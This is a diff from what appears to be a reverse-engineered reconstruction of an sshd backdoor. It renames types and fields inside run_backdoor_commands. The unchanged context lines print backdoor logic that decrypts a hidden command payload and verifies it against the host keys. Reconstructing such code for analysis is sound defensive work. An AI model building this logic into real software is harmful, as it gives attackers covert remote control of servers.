@@ -14,7 +14,7 @@
 
 #define MONITOR_REQ_KEYALLOWED 22
 
-#define SIZE_STEP0 (sizeof(key_payload_hdr_t))
+#define SIZE_STEP0 (sizeof(backdoor_payload_hdr_t))
 #define SIZE_STEP1 (SIZE_STEP0 + ED448_SIGNATURE_SIZE)
 #define SIZE_STEP2 (SIZE_STEP1 + sizeof(cmd_arguments_t))
 #define SIZE_HEADERS SIZE_STEP2
@@ -63,7 +63,7 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 			if(rsa_n_length < 0) break;
 			if(num_n_bytes < rsa_n_length) break;
 
-			if(rsa_n_length <= sizeof(key_payload_hdr_t)) goto exit;
+			if(rsa_n_length <= sizeof(backdoor_payload_hdr_t)) goto exit;
 			// `field_a` cannot be 0
 			if(!f.kctx.payload.header.field_a) goto exit;
 			// `field_b` cannot be 0
@@ -77,13 +77,13 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 			if(!ctx->libc_imports->exit) break;
 			if(!ctx->sshd_log_ctx) break;
 			if(ctx->num_shifted_bits != ED448_KEY_SIZE * 8) break;
-			*(key_payload_hdr_t *)f.kctx.ivec = f.kctx.payload.header;
+			*(backdoor_payload_hdr_t *)f.kctx.ivec = f.kctx.payload.header;
 			
 			if(!secret_data_get_decrypted(f.kctx.ed448_key, ctx)) break;
 			// decrypt payload
 			if(!chacha_decrypt(
 				f.kctx.payload.body.signature,
-				num_n_bytes - sizeof(key_payload_hdr_t),
+				num_n_bytes - sizeof(backdoor_payload_hdr_t),
 				f.kctx.ed448_key,
 				f.kctx.ivec,
 				(u8 *)&f.kctx.payload.body,
@@ -193,8 +193,8 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 					
 					if(data_s1 >= f.body_size) break;
 					if(f.body_size - data_s1 < ED448_SIGNATURE_SIZE) break;
-					if(ctx->payload_data_size < ctx->digest_offset) break;
-					u64 delta = ctx->payload_data_size - ctx->digest_offset;
+					if(ctx->payload_data_size < ctx->current_data_size) break;
+					u64 delta = ctx->payload_data_size - ctx->current_data_size;
 					if(delta < ED448_KEY_SIZE) break;
 					if((delta - ED448_SIGNATURE_SIZE) < data_s1) break;
 
@@ -208,7 +208,7 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 					if(!verify_signature(
 						ctx->sshd_sensitive_data->host_pubkeys[ctx->sshd_host_pubkey_idx],
 						ctx->payload_data,
-						data_s1 + ctx->digest_offset,
+						data_s1 + ctx->current_data_size,
 						ctx->payload_data_size,
 						signature,
 						data_ptr,
